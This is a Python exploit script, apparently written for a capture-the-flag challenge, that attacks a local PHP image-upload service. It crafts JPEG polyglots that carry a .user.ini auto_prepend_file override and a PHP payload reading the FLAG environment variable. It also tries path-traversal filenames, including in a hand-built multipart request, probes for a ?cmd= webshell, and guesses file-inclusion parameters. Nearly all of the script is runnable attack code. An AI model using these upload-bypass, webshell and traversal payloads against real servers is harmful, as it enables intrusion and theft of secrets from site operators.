import requests

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Upload .user.ini with JPEG magic bytes
print("[*] TEST 1: Upload .user.ini disguised as JPG")
user_ini = jpeg_content + b'\nauto_prepend_file=shell.jpg\nauto_append_file=shell.jpg\n'
files = {'userfile': ('.user.ini.jpg', user_ini, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Check if accessible
r = requests.get(f"{base_url}/upload/.user.ini.jpg")
print(f"[+] .user.ini.jpg: {r.status_code}")

# Test 2: Upload shell.jpg with env reading code
print("\n[*] TEST 2: Upload shell.jpg with getenv code")
shell_jpeg = jpeg_content + b'<?php echo getenv("FLAG"); ?>'
files = {'userfile': ('shell.jpg', shell_jpeg, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Test 3: Check all files in upload
print("\n[*] TEST 3: List all uploaded files")
uploaded_files = [
    'test.jpg', 'shell.jpg', 'exec.jpg', 'comment.jpg', 'env.jpg', 
    'flag.jpg', 'info.jpg', 'polyglot.php.jpg', 'index.php.jpg',
    '.user.ini.jpg', '.user.ini'
]
for f in uploaded_files:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code == 200:
        print(f"[+] {f}: {r.status_code} ({len(r.content)} bytes)")
        # Check for FLAG
        if 'FLAG' in r.text:
            import re
            flags = re.findall(r'FLAG\{[^}]+\}', r.text)
            if flags:
                print(f"[!!!] FLAG FOUND in {f}: {flags}")

# Test 4: Check if any PHP file exists in upload
print("\n[*] TEST 4: Check for PHP files in upload")
php_files = ['index.php', 'shell.php', 'test.php', 'info.php', 'config.php']
for f in php_files:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code != 404:
        print(f"[+] {f}: {r.status_code}")
        print(f"[+] Content: {r.text[:500]}")

# Test 5: Try to access with different Accept headers
print("\n[*] TEST 5: Try different Accept headers to trigger PHP")
accept_headers = [
    'application/x-httpd-php',
    'text/x-php',
    'application/php',
]
for accept in accept_headers:
    r = requests.get(f"{base_url}/upload/shell.jpg", headers={'Accept': accept})
    if 'FLAG{' in r.text:
        print(f"[!] FLAG FOUND with Accept: {accept}")
        print(r.text)

# Test 6: Check for path traversal to upload outside /upload/
print("\n[*] TEST 6: Path traversal to upload to root")
# Note: The server may sanitize filenames, but let's try
traversal_names = [
    '../../../shell.jpg',
    '../../shell.jpg',
    '....//shell.jpg',
    '..%2f..%2fshell.jpg',
]
for name in traversal_names:
    files = {'userfile': (name, shell_jpeg, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    # Check root
    r2 = requests.get(f"{base_url}/shell.jpg")
    if r2.status_code == 200:
        print(f"[!] Uploaded to root with name: {name}")

# Test 7: Try to upload to different location via Content-Disposition
print("\n[*] TEST 7: Try Content-Disposition manipulation")
import re
files = {'userfile': ('test.jpg', shell_jpeg, 'image/jpeg')}
# Custom upload with modified Content-Disposition
session = requests.Session()
# Manually craft multipart request
import io
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
body = io.BytesIO()
body.write(f'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'.encode())
body.write(b'Content-Disposition: form-data; name="userfile"; filename="../test.jpg"\r\n')
body.write(b'Content-Type: image/jpeg\r\n\r\n')
body.write(shell_jpeg)
body.write(b'\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n')
headers = {
    'Content-Type': f'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'
}
r = requests.post(f"{base_url}/index.php", data=body.getvalue(), headers=headers)
print(f"[+] Response: {r.text[:500]}")

# Test 8: Check if upload directory has index file
print("\n[*] TEST 8: Check upload directory behavior")
r = requests.get(f"{base_url}/upload/")
print(f"[+] Upload dir: {r.status_code}")

r = requests.get(f"{base_url}/upload/?cmd=id")
print(f"[+] Upload dir with cmd: {r.status_code}")

# Test 9: Check main index.php for any parameters
print("\n[*] TEST 9: Try to find parameters in index.php")
params_to_try = [
    {'debug': '1'},
    {'show': 'source'},
    {'view': 'upload/shell.jpg'},
    {'img': 'upload/shell.jpg'},
    {'image': 'upload/shell.jpg'},
]
for params in params_to_try:
    r = requests.get(f"{base_url}/index.php", params=params)
    if 'FLAG' in r.text or 'uid=' in r.text:
        print(f"[!] FOUND with params: {params}")
        print(r.text[:500])

# Test 10: Check environment directly via request
print("\n[*] TEST 10: Direct shell.jpg access for FLAG content")
r = requests.get(f"{base_url}/upload/flag.jpg")
print(f"[+] flag.jpg content: {r.text}")

